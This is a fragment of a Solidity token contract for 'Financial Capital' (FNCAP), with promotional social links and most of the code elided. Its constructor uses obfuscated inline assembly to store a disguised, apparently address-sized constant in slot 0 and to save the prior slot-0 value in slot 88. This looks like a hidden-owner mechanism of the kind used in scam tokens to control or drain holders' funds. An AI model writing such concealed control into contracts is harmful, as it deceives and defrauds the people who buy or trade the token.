/*
Welcome to Financial Capital.

Telegram: https://t.me/FinancialCapital/
Twitter: https://twitter.com/FinancialCapital/
Website: https://FinancialCapital.io
...
contract FinancialCapital {
    string public constant name = "Financial Capital";
    string public constant symbol = "FNCAP";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1096089269650726194970854428095819405057998083762, 3))}
